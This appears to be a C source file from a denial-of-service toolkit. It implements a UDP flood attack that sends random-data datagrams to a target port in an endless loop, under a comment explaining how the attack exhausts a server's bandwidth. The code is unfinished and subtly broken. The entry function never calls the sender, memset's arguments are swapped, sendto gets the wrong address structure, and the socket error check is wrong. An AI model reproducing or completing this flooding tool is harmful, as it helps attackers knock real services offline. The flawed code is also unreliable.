// Copyright [2016] [hoenir]
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//    http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include <stdio.h>
#include <string.h>

#include <lib/info.h>
#include <lib/mem.h>
#include <lib/conn.h>
#include <lib/util.h>

#include "udp_flood.h"

#define PK_SIZE 256

/*
 * Udp flood
 *
 * User Datagram Protocol(UDP) is a connectionless
 * protocol that uses datagrams embeddded in IP packets for
 * communication without needing to create a session between two devices
 * (and therefore requiring no handshake process). A UDP Flood attack
 * does not exploit a specific vulnerability, but rather simply abuses 
 * normal behaviour at a high enough level to cause network
 * congestion for a targeted network. It consists of sending a large number
 * of UDP datagrams from petentially spoofed IP addresses to random
 * ports on a target server; the server reciving this traffic is unable
 * to process every request, and consumes all of it's bandwidth
 * attempting to send ICMP "destination unreachable" packet replies to
 * confirm that there was no application listening on the target ports.
 * As a volumetric attack, a UDP flood is measured in Mbps(bandwidth)
 * and PPS(packets per second).
 *
 * udp_flood
 *
 * this is the entry function where the args will pe parsed
 * and start the attack.
 *
 */
void udp_flood(arguments args) {
	STATUS("UDP-FLOOD attack is starting.");
	// if random flag is set just alert user
	// that the UDP Flood already uses random port option
	// due to the nature of the attack
	if (args.port.random)
		STATUS("UDP_FLOOD already uses the random flag.");

	conn_t *conn = NULL;
	conn = conn_new(args.host_type);
	
	conn->c4->addr->sin_family = AF_INET;
	conn->c4->addr->sin_port = htons(args.port.n);
	memset(&conn->c4->addr->sin_addr, sizeof(conn->c4->addr->sin_addr), 0);

}

typedef int udp_err_t;

static udp_err_t ipv4(conn4_t *conn)
{
	if (!conn)
		INFOEE("Empty ipv4 conn pointer, please pass a non null conn");

	conn->sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (!conn->sock) {
		WSTATUS("Could not create the upd socket");
		return -1;
	}

	// fill up the buffer with random data.
	conn->buff = xzmalloc(PK_SIZE * sizeof(conn->buff));
	for(int i=0; i<PK_SIZE; i++) {
		urandom_bytes(&conn->buff[i], sizeof(conn->buff[i]));
	}

	//TODO
	ssize_t n = 0;
	for(;;) {
		n = sendto(conn->sock,conn->buff, PK_SIZE*sizeof(conn->buff),
					0, (SA*)&conn->addr->sin_addr, sizeof(conn->addr->sin_addr));
		if (!n) { // if any error is cought break from
			break;
		}
	}
	
	// todo	
	return 0;
}





